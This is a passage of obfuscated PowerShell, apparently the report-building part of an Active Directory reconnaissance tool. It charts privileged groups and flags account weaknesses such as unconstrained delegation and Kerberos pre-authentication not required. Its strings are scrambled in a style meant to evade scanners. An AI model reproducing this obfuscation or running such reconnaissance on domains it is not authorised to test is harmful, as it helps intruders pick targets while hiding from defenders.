            ("{4}{0}{2}{1}{3}{5}"-f 'ount ','p','O','erato','Acc','rs'),("{0}{1}{2}"-f'Administ','ra','tors'),("{1}{0}{3}{2}" -f 'up Operat','Back','rs','o'),("{3}{0}{1}{2}"-f'ert ','Publisher','s','C'),("{1}{2}{4}{0}{3}" -f 'ator','Cr','ypto Op','s','er'),("{2}{1}{0}"-f's','dmin','DnsA'),("{2}{0}{1}" -f'A','dmins','Domain '),("{0}{3}{1}{2}" -f 'Ent','i','ns','erprise Adm'),("{2}{0}{1}{3}{4}"-f 'e',' K','Enterpris','ey ','Admins'),("{0}{1}{7}{3}{4}{5}{6}{2}"-f 'I','n','ilders',' Fores','t',' Trus','t Bu','coming'),("{0}{2}{1}" -f 'K','mins','ey Ad'),("{10}{9}{4}{13}{8}{12}{7}{2}{1}{14}{0}{6}{11}{5}{3}"-f 'ics ','at An','re','s','t Ad','or','Ad','Th','ed','of','Micros','ministrat',' ','vanc','alyt'),("{1}{3}{2}{4}{0}"-f'rs','N','Operat','etwork ','o'),("{1}{0}{3}{2}"-f'er','Print Op','tors','a'),("{1}{2}{0}"-f 's','Protecte','d User'),("{2}{3}{1}{0}"-f 'op Users','skt','Remo','te De'),("{1}{2}{0}" -f'dmins','Schema',' A'),("{2}{1}{0}{3}"-f'ato','Oper','Server ','rs') | &("{3}{2}{1}{0}" -f 'ject','ach-Ob','E','For') {
                Try
                {
                    ${wO`RK`sh`EeT}.("{0}{3}{1}{2}" -f 'Pi','tTab','les','vo').Invoke(${p`ivO`TT`ABLEN`Ame}).("{3}{1}{0}{2}" -f 'i','tF','elds','Pivo').Invoke(("{1}{2}{0}"-f 'Name','G','roup ')).("{3}{0}{1}{2}"-f't','I','tems','Pivo').Invoke(${_})."vISI`BlE" = ${T`RUE}
                }
                Catch
                {
                    
                }
            }

            
            ${WO`RK`SHeet}.("{0}{2}{1}" -f'Pivot','s','Table').Invoke(${piv`OTtaBlenA`Me}).("{1}{2}{0}{3}"-f 'tFi','P','ivo','elds').Invoke(("{2}{1}{0}" -f'me','oup Na','Gr'))."AutOSo`RT"(  (  GEt-VArIablE 7Tu6 -Val  )::"xLDEs`c`endi`Ng",("{3}{0}{1}{4}{2}"-f'(Not','-Recur','ve)','Count ','si'))

            ${wO`R`KS`HEEt}."C`eLlS".("{1}{0}" -f 'tem','I').Invoke(3,1)."inTE`Ri`OR"."co`lORi`NdeX" = 5
            ${wORks`h`EeT}."CEl`ls".("{0}{1}" -f'I','tem').Invoke(3,1)."F`ONT"."col`OrI`NdEx" = 2

            ${E`xc`EL}."SC`Re`enU`Pdating" = ${Tr`UE}

            &("{5}{3}{1}{4}{2}{0}" -f't','AD','xcelChar','t-','RE','Ge') -ChartType ("{3}{4}{1}{0}{2}"-f 'ust','Cl','ered','xlColu','mn') -ChartLayout 10 -ChartTitle ("{3}{4}{0}{1}{2}"-f'Grou','ps',' in AD','Privileg','ed ') -RangetoCover ("{1}{0}" -f '6','D2:P1') -StartRow "A3" -StartColumn "B3"
            ${w`Or`KBOoK}."Wor`K`shEetS".("{1}{0}"-f'em','It').Invoke(1)."h`yPer`LIN`Ks".("{0}{1}" -f'Ad','d').Invoke(${wo`R`KbOok}."w`oRkshEE`Ts".("{1}{0}"-f 'em','It').Invoke(1)."CEL`LS".("{1}{0}" -f 'm','Ite').Invoke(1,4) , "" , ((("{6}{5}{2}{3}{1}{0}{7}{4}" -f 'Mem','p ','Gr','ou','ersCEb!A1','b','CE','b'))."R`EPLaCe"('CEb',[sTRing][chAr]39)), "", ("{0}{2}{1}" -f 'Raw','ta',' Da')) | &("{1}{0}" -f 'Null','Out-')
            ${e`XC`El}."w`in`DOWS".("{1}{0}" -f 'em','It').Invoke(1)."dISp`L`AygRiD`lIN`ES" = ${FA`lse}

            &("{4}{6}{0}{5}{3}{1}{2}" -f 'mO','l','ease','e','Get-ADRExce','bjR','lCo') -ComObjtoRelease ${wOr`k`SHeEt}
            &("{2}{1}{3}{0}" -f'e','ve','Remo','-Variabl') ("{1}{0}" -f'rksheet','wo')
        }

        
        ${ADFi`LeN`AMe} = -join(${rEPO`Rtp`ATh},'\',("{2}{0}{4}{3}{1}" -f'o','sv','C','.c','mputers'))
        If (&("{1}{2}{0}"-f'th','T','est-Pa') ${ad`FilEN`Ame})
        {
            &("{1}{5}{0}{4}{3}{2}"-f 'E','Get-','book','rk','xcelWo','ADR') -Name ("{3}{0}{2}{1}"-f'mpu',' Stats','ter','Co')
            &("{2}{0}{1}" -f '-Varia','ble','Remove') ("{2}{1}{0}"-f 'me','eNa','ADFil')

            ${oBJat`TRibUt`ES} = &("{2}{0}{3}{1}" -f 'ew-O','ct','N','bje') ("{8}{6}{2}{5}{0}{1}{4}{3}{7}"-f 'S','pec','llectio','redDict','ialized.Orde','ns.','stem.Co','ionary','Sy')
            ${oB`j`A`TtrIBUt`Es}.("{0}{1}"-f'A','dd').Invoke(("{0}{4}{2}{3}{1}" -f'De',' Typ','t','ion','lega'),((("{1}{0}{4}{5}{3}{2}"-f'0}Uncons','{','0}','d{','tr','aine'))  -f [ChAR]34))
            ${oBj`ATtR`IBU`TEs}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}{3}"-f'De','tion T','lega','ype'),((("{1}{3}{0}{2}" -f 'G','GUhCons','Uh','trained'))."Re`Pla`CE"(([chAr]71+[chAr]85+[chAr]104),[StrINg][chAr]34)))
            ${O`B`j`AtTribUT`Es}.("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}{3}"-f 'SI','DHi','st','ory'),'"*"')
            ${oB`JATt`RI`B`UtES}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{1}" -f'Dor','mant'),((("{1}{0}{2}" -f'LTRUEc','cI','IL'))  -RePlACe  'cIL',[Char]34))
            ${OB`JA`TtR`ibU`Tes}.("{0}{1}" -f 'A','dd').Invoke(((("{1}{0}{2}"-f'ssword Age (','Pa','> '))),((("{0}{1}" -f '0n6TR','UE0n6')) -CRepLace  '0n6',[ChAR]34))
            ${O`BjA`TTRiB`UT`Es}.("{1}{0}"-f'd','Ad').Invoke(("{1}{3}{2}{4}{0}" -f'orSid','ms-d','rea','s-C','t'),'"*"')

            &("{3}{1}{2}{0}{4}{5}"-f 'elAtt','D','RExc','Get-A','ribute','Stats') -SrcSheetName ("{2}{1}{0}" -f 's','mputer','Co') -Title1 ("{2}{5}{4}{0}{3}{1}"-f'co','nts in AD','Compu','u','r Ac','te') -PivotTableName ("{1}{5}{3}{0}{2}{4}{6}" -f'Accoun','C','ts','uter ',' ','omp','Status') -PivotRows ("{1}{0}" -f 'nabled','E') -PivotValues ("{1}{0}"-f 'erName','Us') -PivotPercentage ("{1}{0}{2}" -f 'rNa','Use','me') -Title2 ("{2}{5}{6}{1}{7}{0}{4}{3}" -f 'er Ac','m','Sta','ounts','c','tus of',' Co','put') -ObjAttributes ${OBJat`Tr`ibUT`es}
            &("{2}{3}{0}{1}"-f 'Vari','able','R','emove-') ("{0}{1}{2}" -f'ObjAttribu','te','s')

            
            For(${i} = 1 ; ${i} -le ${w`orkb`oOK}."sh`EeTs"."C`OuNT" ; ${I}++)
            {
                ${srcShEEt`Na`mE} = ("{1}{0}" -f 'S','LAP')
                If (${wor`kbo`OK}."wO`Rk`ShE`ETs".("{0}{1}" -f'it','em').Invoke(${i})."NA`ME" -eq ${SrCs`He`e`TNAmE})
                {
                    ${Ad`R`lapsC`hE`ck} = ${TR`Ue}
                    break
                }
                Else
                {
                   ${aDRl`A`P`SC`HEcK} = ${FAL`sE}
                }
            }
            If (${aD`Rlap`S`c`Heck})
            {
                ${WO`RK`shE`Et} = ${Wor`K`Book}."WO`Rks`HEETs".("{0}{1}" -f 'It','em').Invoke(1)
                ${EX`CElc`olUMN} = ${woR`kBOOK}."ShEe`TS".("{1}{0}"-f 'm','Ite').Invoke(("{0}{1}" -f 'LA','PS'))."cOlU`MNS".("{1}{0}"-f'ind','F').Invoke(("{1}{0}" -f 'd','Store'))
                ${CO`LAD`dRESS} = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
                ${I} = 9
                ${r`ow} = 9
                ${cOLU`Mn} = 6
                ${w`orKsh`eEt}."ce`Lls".("{1}{0}" -f 'tem','I').Invoke(${R`OW}, ${cOl`UMN}) = ("{0}{1}" -f 'LAP','S')
                ${W`or`KSHEeT}."C`ELlS".("{0}{1}" -f'I','tem').Invoke(${R`oW}, ${c`oLu`Mn}+1)."F`o`RMULA" = (((("{3}{4}{1}{0}{2}" -f'(','UNTIFS','{0}','=','CO'))-f [chaR]39)) + ${Sr`cshEe`TNaME} + "'!" + "B:B" + ((("{2}{3}{0}{1}"-f'TRUE','Fxu,',',F','xu'))."rEp`l`ACe"(([CHaR]70+[CHaR]120+[CHaR]117),[sTRing][CHaR]34)) + "'" + ${s`RcSHe`etNAmE} + "'!" + ${coL`A`D`DReSS} + ',' + ("{1}{0}" -f 'RUE','T') + ')'
                ${W`O`RkShe`Et}."Ce`lLs".("{0}{1}"-f'I','tem').Invoke(${R`ow}, ${Col`U`MN}+2)."forM`U`LA" = ((("{0}{1}{2}"-f'=IFE','RROR(','G'))) + ${I} + (((("{3}{1}{11}{2}{9}{4}{7}{0}{10}{8}{6}{5}"-f '4g0,','LOOKU','(4g','/V','Enabl','),0)','LSE','ed',',FA','0','A3:B6,2','P'))  -ReplAce  ([ChAr]52+[ChAr]103+[ChAr]48),[ChAr]34))
                ${wO`Rks`Heet}."CE`llS".("{0}{1}"-f 'Ite','m').Invoke(${r`Ow}, ${cOLU`mn}+3)."foR`muLA" = (((("{0}{1}{2}{3}" -f '=COU','N','TI','FS(Zj2'))-rEpLACe ([Char]90+[Char]106+[Char]50),[Char]39)) + ${S`RcshE`etNa`mE} + "'!" + "B:B" + ((("{0}{2}{3}{1}"-f',{','},','0','}FALSE{0')) -F  [cHAr]34) + "'" + ${src`sHE`etNA`me} + "'!" + ${c`O`l`ADDREsS} + ',' + ("{1}{0}" -f'E','TRU') + ')'
                ${wo`RkSHe`eT}."ce`lLS".("{1}{0}" -f'tem','I').Invoke(${R`ow}, ${cO`L`Umn}+4)."f`ORmuLA" = ((("{0}{1}{3}{2}"-f '=IFE','R','OR(I','R'))) + ${I} + (((("{0}{6}{5}{7}{2}{4}{3}{8}{1}" -f '/',')','ddk','6,2,FALSE),','y,A3:B','OKUP(dky','VLO','Disable','0')) -CrepLaCe ([ChAr]100+[ChAr]107+[ChAr]121),[ChAr]34))
                ${w`orksh`EET}."cEL`Ls".("{0}{1}"-f'I','tem').Invoke(${R`ow}, ${CoL`Umn}+5)."fO`RM`ULA" = ((("{0}{1}{2}" -f '=','COUNTI','F(0Y2'))."rEPL`A`cE"('0Y2',[String][CHar]39)) + ${SRC`s`he`e`TnamE} + "'!" + ${C`OLad`d`RESS} + ',' + ("{0}{1}"-f 'T','RUE') + ')'
                ${w`OR`K`shEEt}."c`ells".("{0}{1}" -f'I','tem').Invoke(${R`OW}, ${C`Ol`UMN}+6)."F`O`RMUlA" = ((("{0}{1}{2}" -f '=','IF','ERROR(K'))) + ${i} + (((("{0}{1}{5}{7}{3}{4}{8}{2}{6}" -f '/','VLOOKU',',0','A3:B6,2,','FALS','P(JL',')','vTotalJLv,','E)'))-repLacE'JLv',[chAr]34))

                
                "H", "J" , "L" | &("{3}{0}{2}{1}"-f 'rE','Object','ach-','Fo') {
                    ${R`NG} = ${_} + "9" + ":" + ${_} + $(${r`ow})
                    ${w`OrkS`heet}.("{0}{1}"-f 'R','ange').Invoke(${R`NG})."NuMb`ERF`Orm`At" = ("{0}{1}"-f'0.0','0%')
                }

                &("{4}{3}{0}{2}{1}" -f'DRExc','Chart','el','et-A','G') -ChartType ("{1}{0}" -f'ie','xlP') -ChartLayout 3 -ChartTitle ("{0}{2}{1}{3}{4}" -f 'Comp','er Accoun','ut','ts in ','AD') -RangetoCover ("{0}{1}"-f 'A12:D2','4') -ChartData ${wO`R`kbOOk}."woRKs`h`eets".("{0}{1}"-f 'It','em').Invoke(1).("{0}{1}"-f'Rang','e').Invoke(("{0}{1}{2}"-f'A3:A','4,B3:','B4'))
                ${wo`RKBO`OK}."w`OrKS`h`eETs".("{0}{1}"-f'It','em').Invoke(1)."Hyp`eRL`INkS".("{1}{0}" -f 'dd','A').Invoke(${woR`KBoOk}."WoR`K`SHeeTs".("{0}{1}"-f'It','em').Invoke(1)."cEl`Ls".("{0}{1}" -f'It','em').Invoke(11,1) , "" , ("{0}{2}{1}" -f 'Comp','A1','uters!'), "", ("{0}{2}{1}" -f'Raw ','ata','D')) | &("{1}{2}{0}"-f 't-Null','O','u')

                &("{3}{0}{2}{4}{1}" -f 'RExc','rt','elCh','Get-AD','a') -ChartType ("{1}{0}{2}"-f 'rClustere','xlBa','d') -ChartLayout 1 -ChartTitle ("{5}{1}{0}{4}{3}{2}"-f'mp',' Co','s','er Account','ut','Status of') -RangetoCover ("{1}{2}{0}" -f'4','F12:','L2') -ChartData ${w`oRkB`OOk}."w`O`R`kSheeTs".("{1}{0}"-f 'em','It').Invoke(1).("{1}{0}" -f'e','Rang').Invoke(("{2}{0}{1}" -f '2:F9,G2:G','9','F'))
                ${wO`RkBO`oK}."wor`kSHE`ets".("{1}{0}"-f 'tem','I').Invoke(1)."hyp`ErLIN`KS".("{0}{1}"-f 'Ad','d').Invoke(${wOR`KBook}."WO`RKSHeE`TS".("{1}{0}"-f 'em','It').Invoke(1)."cEL`ls".("{1}{0}" -f'm','Ite').Invoke(11,6) , "" , ("{0}{1}{2}{3}" -f'Com','put','er','s!A1'), "", ("{2}{0}{1}" -f'Da','ta','Raw ')) | &("{1}{0}{2}"-f 'ut-N','O','ull')
            }
            Else
            {
                &("{3}{0}{2}{1}" -f 'D','elChart','RExc','Get-A') -ChartType ("{1}{0}"-f 'ie','xlP') -ChartLayout 3 -ChartTitle ("{1}{2}{4}{3}{6}{5}{0}"-f'n AD','Co','mput','Acco','er ',' i','unts') -RangetoCover ("{0}{1}{2}"-f 'A','11:D2','3') -ChartData ${wo`R`KB`oOk}."W`orksh`e`ETS".("{1}{0}" -f 'm','Ite').Invoke(1).("{0}{1}"-f 'Ran','ge').Invoke(("{1}{0}{2}" -f'3','A',':A4,B3:B4'))
                ${w`o`RKBook}."w`O`RkSHeeTs".("{0}{1}" -f'It','em').Invoke(1)."h`yPE`RLinKS".("{0}{1}" -f 'A','dd').Invoke(${w`Or`KboOK}."wor`Kshe`Ets".("{0}{1}"-f 'I','tem').Invoke(1)."C`ElLS".("{1}{0}"-f 'm','Ite').Invoke(10,1) , "" , ("{3}{2}{1}{0}" -f 'ers!A1','t','pu','Com'), "", ("{0}{1}" -f 'Raw',' Data')) | &("{1}{0}"-f '-Null','Out')

                &("{4}{3}{1}{2}{0}"-f 't','ha','r','t-ADRExcelC','Ge') -ChartType ("{3}{2}{0}{1}"-f'e','d','luster','xlBarC') -ChartLayout 1 -ChartTitle ("{0}{2}{1}{4}{3}{5}"-f'Stat',' of Co','us','nt','mputer Accou','s') -RangetoCover ("{1}{0}{2}"-f '11:L2','F','3') -ChartData ${W`ORk`BOoK}."wor`K`sheEtS".("{0}{1}"-f'I','tem').Invoke(1).("{0}{1}" -f 'R','ange').Invoke(("{2}{1}{3}{0}" -f '8','F8,G','F2:','2:G'))
                ${WoR`KBo`oK}."wo`Rksh`eeTS".("{1}{0}"-f 'em','It').Invoke(1)."hYP`erl`IN`KS".("{0}{1}" -f 'A','dd').Invoke(${w`ORKBOoK}."Wo`R`Kshee`TS".("{1}{0}" -f'm','Ite').Invoke(1)."CEl`LS".("{0}{1}" -f'I','tem').Invoke(10,6) , "" , ("{1}{0}{2}{3}"-f'mput','Co','ers','!A1'), "", ("{0}{2}{1}" -f'Raw Da','a','t')) | &("{0}{1}{2}"-f 'O','u','t-Null')
            }

            ${w`oR`K`BOOk}."W`O`RK`SHEetS".("{1}{0}" -f'tem','I').Invoke(1)."US`e`DRA`NGE"."entiRE`COl`U`mN".("{0}{2}{1}" -f'Aut','Fit','o').Invoke() | &("{0}{1}"-f 'Out','-Null')
            ${e`XceL}."w`I`NDowS".("{0}{1}"-f 'I','tem').Invoke(1)."D`iSPlAY`gR`IdLINES" = ${FAL`SE}
        }

        
        ${a`d`FILEn`AmE} = -join(${r`E`PortpatH},'\',("{2}{1}{0}"-f 'csv','.','Users'))
        If (&("{3}{1}{2}{0}" -f 'h','st-Pa','t','Te') ${Ad`FileN`Ame})
        {
            &("{0}{1}{3}{2}{4}" -f 'Get-','ADR','elWo','Exc','rkbook') -Name ("{0}{3}{1}{2}" -f 'Us','r',' Stats','e')
            &("{0}{3}{2}{1}" -f'Rem','Variable','e-','ov') ("{1}{2}{0}" -f'leName','A','DFi')

            ${Ob`J`A`TTRibUTeS} = &("{1}{0}{2}"-f'e','N','w-Object') ("{2}{6}{8}{0}{7}{1}{5}{4}{3}" -f's','cia','S','y','redDictionar','lized.Orde','ystem.Collecti','.Spe','on')
            ${OBJ`ATtRIbu`TEs}.("{0}{1}"-f'Ad','d').Invoke(("{3}{7}{0}{1}{6}{4}{2}{5}"-f'an','g','o','Must',' Password at L','gon','e',' Ch'),((("{0}{2}{1}"-f'2U','TRUE2Ue','e'))-cRePlacE '2Ue',[ChAR]34))
            ${OBjatt`RIBU`T`eS}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{2}{1}{4}{6}{0}{3}" -f 'swor','t Chan','o','d','ge ','Cann','Pas'),((("{1}{0}{2}"-f'MQT','A','RUEAMQ'))."repLa`cE"(([cHar]65+[cHar]77+[cHar]81),[sTRiNg][cHar]34)))
            ${Ob`jat`T`R`ibUTEs}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{3}{2}{4}" -f'P','assword N','er ','ev','Expires'),((("{2}{1}{0}{3}"-f'PS','TRUE','PSx','x'))  -CRePlACe([CHaR]80+[CHaR]83+[CHaR]120),[CHaR]34))
            ${o`BJat`T`RiB`UteS}.("{0}{1}"-f'A','dd').Invoke(("{4}{8}{2}{0}{5}{7}{3}{6}{1}" -f 'word','n',' Pass','yp','Re',' E','tio','ncr','versible'),((("{2}{1}{0}" -f 'N','9','K9NTRUEK'))  -rEplAce 'K9N',[CHAR]34))
            ${O`BJAtT`Ri`ButeS}.("{0}{1}" -f'A','dd').Invoke(("{1}{6}{3}{2}{5}{0}{4}"-f'r','Smar','Logo','card ','ed','n Requi','t'),((("{2}{0}{1}"-f '}TR','UE{0}','{0')) -F [CHAR]34))
            ${O`BjAttriBU`TeS}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{0}{1}{3}{2}"-f'on Perm','i','ed','tt','Delegati'),((("{3}{0}{1}{2}"-f 'U','E','NE0','NE0TR'))."Rep`La`cE"('NE0',[stRING][ChAR]34)))
            ${Ob`JAtT`Ri`BuTEs}.("{0}{1}" -f'Ad','d').Invoke(("{4}{0}{3}{1}{2}"-f 'r',' ','Only','beros DES','Ke'),((("{1}{0}{2}" -f'T','{0}','RUE{0}')) -F [CHAr]34))
            ${OBJA`TT`R`iB`UtEs}.("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{0}{3}"-f'rberos R','K','e','C4'),((("{2}{1}{0}" -f'UELsn','snTR','L'))."R`EpLace"('Lsn',[stRing][cHAR]34)))
            ${oBJ`AT`TrI`BuT`Es}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{4}{2}{0}" -f'Auth','Does Not','e ',' Re','quire Pr'),((("{0}{2}{1}" -f 'Zz','TRUEZzJ','J'))."r`E`pLaCE"('ZzJ',[sTRiNG][CHAr]34)))
            ${o`Bja`TTRIbuteS}.("{0}{1}"-f'A','dd').Invoke(((("{3}{0}{2}{1}" -f 'as','e (> ','sword Ag','P'))),((("{3}{0}{1}{2}"-f'Em','9','I','m9ITRU'))  -RepLacE  'm9I',[chAr]34))
            ${Objat`T`R`I`BUTes}.("{0}{1}" -f'Ad','d').Invoke(("{2}{4}{1}{3}{0}" -f 'ed Out','count Lo','A','ck','c'),((("{0}{3}{1}{2}" -f'DMFTR','DM','F','UE'))."r`EPlaCE"('DMF',[STrING][CHar]34)))
            ${oBjat`TriB`UTes}.("{1}{0}"-f 'dd','A').Invoke(("{4}{1}{0}{2}{3}"-f'ge','Log','d ','in','Never '),((("{1}{3}{2}{0}" -f'0}','{0}TR','E{','U'))  -f[CHar]34))
            ${O`BJA`TTrIBuTES}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}"-f'ormant','D'),((("{0}{2}{3}{1}" -f'{','{0}','0}','TRUE'))  -F  [CHAR]34))
            ${OB`Jatt`R`ibUtES}.("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{3}{1}{4}"-f 'd N',' Requi','Passwor','ot','red'),((("{2}{1}{0}" -f'1gJ','JTRUE','1g'))."REp`LACE"(([chaR]49+[chaR]103+[chaR]74),[strINg][chaR]34)))
            ${obj`ATtr`i`B`UteS}.("{0}{1}"-f'A','dd').Invoke(("{3}{4}{1}{2}{0}" -f'p','egati','on Ty','De','l'),((("{4}{3}{0}{5}{6}{2}{1}"-f'tra','0}','{','0}Uncons','{','in','ed'))-f[CHAR]34))
            ${oBJaTt`R`ib`U`Tes}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}" -f'story','DHi','SI'),'"*"')

            &("{3}{1}{2}{6}{0}{5}{4}"-f 'RExcelAttrib','-','A','Get','tats','uteS','D') -SrcSheetName ("{0}{1}" -f'User','s') -Title1 ("{1}{0}{2}{4}{3}"-f 'ser A','U','c','in AD','counts ') -PivotTableName ("{4}{2}{3}{5}{0}{6}{1}"-f't','tus','er',' Accou','Us','n','s Sta') -PivotRows ("{1}{0}" -f'd','Enable') -PivotValues ("{0}{2}{1}" -f'Use','e','rNam') -PivotPercentage ("{2}{1}{0}" -f 'me','serNa','U') -Title2 ("{1}{3}{0}{2}{5}{4}"-f'us of Us','Sta','er','t','ccounts',' A') -ObjAttributes ${OBJAtTrib`U`T`Es}
            &("{1}{3}{2}{0}" -f'le','Remove','b','-Varia') ("{1}{3}{2}{0}" -f'es','ObjAt','t','tribu')

            &("{4}{1}{3}{0}{2}" -f'elC','Ex','hart','c','Get-ADR') -ChartType ("{1}{0}" -f 'e','xlPi') -ChartLayout 3 -ChartTitle ("{5}{2}{1}{4}{6}{3}{0}"-f'AD','ou','Acc','n ','nts','User ',' i') -RangetoCover ("{2}{1}{0}" -f':D33','1','A2') -ChartData ${wOr`kB`oOk}."W`orkSH`EeTS".("{0}{1}" -f 'I','tem').Invoke(1).("{1}{0}" -f 'ge','Ran').Invoke(("{1}{0}{2}{3}"-f'A4,B','A3:','3',':B4'))
            ${WoR`kb`Ook}."wor`ksHE`Ets".("{0}{1}"-f'It','em').Invoke(1)."h`ypErL`InKs".("{0}{1}" -f'A','dd').Invoke(${W`o`RKbOOk}."W`oR`k`SHeEts".("{1}{0}"-f 'm','Ite').Invoke(1)."c`ElLs".("{1}{0}"-f'em','It').Invoke(20,1) , "" , ("{2}{1}{0}"-f'!A1','ers','Us'), "", ("{2}{1}{0}" -f'w Data','a','R')) | &("{0}{2}{1}"-f'O','ll','ut-Nu')

            &("{3}{1}{0}{2}" -f 'ADRExcel','-','Chart','Get') -ChartType ("{4}{3}{0}{2}{1}"-f'l','ed','uster','rC','xlBa') -ChartLayout 1 -ChartTitle ("{2}{0}{4}{3}{1}"-f'atus','nts','St','er Accou',' of Us') -RangetoCover ("{1}{0}" -f '3','F21:L4') -ChartData ${WOrK`B`o`Ok}."wo`RKSHE`eTS".("{0}{1}"-f 'I','tem').Invoke(1).("{0}{1}"-f'R','ange').Invoke(("{1}{0}{2}"-f'18,G2:G1','F2:F','8'))
            ${wo`RK`BoOK}."Work`sHE`e`Ts".("{0}{1}"-f 'It','em').Invoke(1)."hyP`Erl`Inks".("{1}{0}"-f'd','Ad').Invoke(${Wor`KbO`oK}."WO`RKshEe`TS".("{1}{0}" -f'm','Ite').Invoke(1)."ce`LLs".("{1}{0}" -f 'm','Ite').Invoke(20,6) , "" , ("{1}{0}{2}"-f'!A','Users','1'), "", ("{1}{2}{0}" -f 'ta','Ra','w Da')) | &("{1}{2}{0}"-f 'll','O','ut-Nu')

            ${w`o`RKBook}."wo`RkShEe`Ts".("{0}{1}" -f 'Ite','m').Invoke(1)."US`ED`Ra`NGe"."Ent`IrEC`OluMN".("{1}{2}{0}" -f 'Fit','Au','to').Invoke() | &("{0}{2}{1}" -f'Out-','ull','N')
            ${E`XcEl}."W`i`NDOWs".("{1}{0}" -f'tem','I').Invoke(1)."d`iSpLAYGRidLi`N`eS" = ${Fa`Lse}
        }

        
        &("{3}{0}{1}{2}{5}{4}" -f 'et','-ADRExc','elWor','G','ok','kbo') -Name ("{2}{3}{1}{0}" -f 'nts','nte','Ta','ble of Co')
        ${Wo`R`ksHEet} = ${wOR`kBO`oK}."woRkS`HE`EtS".("{0}{1}" -f'I','tem').Invoke(1)

        ${ExC`el}."Scr`EE`NU`pD`ATING" = ${f`ALse}
        
        
        

        If (${lO`GO} -eq ("{2}{1}{0}"-f'berCX','y','C'))
        {
            ${b`As`e64aDRE`con} = ("{219}{151}{147}{380}{307}{292}{317}{16}{156}{186}{338}{119}{294}{397}{345}{115}{149}{164}{0}{6}{79}{268}{240}{71}{328}{101}{39}{153}{112}{17}{257}{347}{356}{185}{312}{207}{193}{237}{250}{234}{130}{256}{157}{297}{374}{31}{272}{309}{398}{373}{385}{35}{15}{26}{383}{320}{202}{313}{339}{54}{282}{199}{376}{3}{311}{258}{81}{80}{233}{350}{28}{89}{96}{344}{368}{135}{43}{38}{59}{117}{324}{253}{44}{388}{249}{128}{182}{187}{84}{46}{300}{375}{400}{142}{218}{330}{378}{302}{357}{198}{173}{168}{267}{41}{154}{184}{165}{203}{209}{45}{246}{22}{252}{118}{284}{67}{318}{180}{75}{11}{319}{348}{25}{265}{325}{68}{323}{29}{85}{306}{91}{105}{366}{278}{235}{251}{392}{262}{146}{188}{238}{333}{358}{158}{5}{57}{342}{82}{365}{56}{254}{139}{121}{352}{224}{20}{197}{261}{47}{175}{98}{170}{116}{329}{286}{303}{48}{228}{222}{52}{144}{289}{178}{62}{399}{226}{244}{99}{391}{401}{63}{90}{277}{88}{291}{227}{36}{301}{100}{134}{271}{266}{281}{245}{210}{229}{225}{103}{326}{110}{390}{369}{2}{72}{125}{214}{396}{283}{94}{124}{255}{132}{316}{179}{120}{343}{337}{299}{354}{217}{241}{270}{42}{58}{123}{161}{86}{394}{150}{236}{78}{95}{23}{1}{247}{7}{8}{304}{140}{14}{32}{143}{389}{49}{114}{279}{321}{287}{353}{370}{367}{126}{220}{133}{92}{298}{138}{196}{216}{213}{19}{212}{310}{70}{191}{102}{361}{359}{174}{201}{30}{269}{40}{211}{232}{77}{127}{285}{371}{87}{206}{163}{305}{169}{242}{69}{176}{61}{293}{362}{136}{172}{308}{177}{260}{181}{160}{288}{346}{259}{83}{377}{131}{273}{141}{382}{183}{331}{360}{152}{363}{21}{231}{204}{10}{97}{243}{192}{395}{223}{50}{109}{295}{355}{33}{274}{27}{93}{65}{64}{60}{13}{111}{76}{137}{24}{314}{205}{332}{122}{195}{155}{104}{55}{379}{315}{351}{200}{12}{106}{208}{296}{276}{73}{341}{230}{364}{107}{381}{129}{51}{9}{393}{280}{384}{171}{335}{34}{167}{4}{248}{66}{263}{74}{194}{108}{190}{327}{189}{275}{215}{148}{162}{166}{37}{53}{322}{239}{349}{336}{113}{386}{264}{145}{334}{159}{340}{290}{221}{387}{18}{372}" -f 'zEuMC8iIHht','8yJO8qjqF2LS3LD77cL9fX8KtpIkkYlU/KRnNcbqF2bu4LD7i8L9P','1Xg1uW15b3YzE3PcHqK4Wno7xsHQkMOhFTKknsO56DRWbp18LyPD8SL19/etKudqzsxnP3up3lrcNFtTHVTg8j86qf25d/wB1PyP+NbGqWn2qDcg+dOR7juK46t','gICAgICAgICAgICAgICAgIC','2P2OPc/MjdfYe','IEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyI','bG5zOnhtcE1NPSJodH','nWn2S3Ct99uW/w/CtpyshIvAAAAcAUtFFcpR//U','2NQiM1pIoGSBkfhXF49Onb','sNf7jfQ1kVsMMqR6iqH2W','O3nl+6h565yAB6c1cT','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC','qDyhx7GtlNNWkZuLWqHrcxHrxTjcRD+KqZt5R2zTfIl/u0cke4c0iw90OkY/E1TJLHJ5JqwtrIfvYFW44Uj5HJ9afNGOwrN7jYIvLXLfeNT0UVi3fU0SsFFFFIZHKu+MrWUCRyK2ayp','GBRgUUUAGBRVcXMZYqePerFNprcSdxr/AH','f','gICAgICAgICAgICAgICAgICAgICAg','AAAQABAACgAgAEAAAAAQAAAligAwAEAAAAAQAAAKcAAAAA/+EK','A4MDFFN0FENyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpCN','KACii','8jgetWRaJ3','OCMyy','E','ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg','VlswRLXI6tafZ5/NQfJJz9D3FddVe6t1uoGhbv0Poe1ZwlZjODrrdIu/Ph8lz88f6jtXKujRuY3GGU4NS21w1tOsyduo9R3FdE4','wW1wcEcKx','gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg','ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA